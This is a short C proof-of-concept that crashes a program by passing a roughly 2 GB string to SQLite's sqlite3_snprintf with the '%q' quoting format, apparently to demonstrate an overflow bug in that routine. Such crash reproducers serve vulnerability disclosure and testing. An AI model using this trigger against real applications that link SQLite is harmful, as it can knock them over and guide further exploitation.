/*
 * $ gcc snprintf-crash.c -I/usr/include/ -L/usr/lib/x86_64-linux-gnu/ -l:libsqlite3.so
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sqlite3.h>

int main(int argc, char *argv[]) {

    /* Create large input string and fill it with 'a' characters */
    size_t src_buf_size = 0x7ffffffe;
    char *src = malloc(src_buf_size);
    if (!src) {
        printf("bad allocation\n");
        return -1;
    }
    memset(src, 'a', src_buf_size);
    src[src_buf_size-1] = '\0';

    /* Allocate an output buffer - size does not matter */
    size_t dst_buf_size = 0x100;
    char *dst = calloc(1, dst_buf_size);
    if (!dst) {
        printf("bad allocation\n");
        return -1;
    }

    /* Cause program crash */
    sqlite3_snprintf((int) dst_buf_size, dst, "'%q'", src);
    
    /* Not reached. */
    printf("quoted buffer: %s", dst);
    free(dst);
    free(src);
    return 0;
}

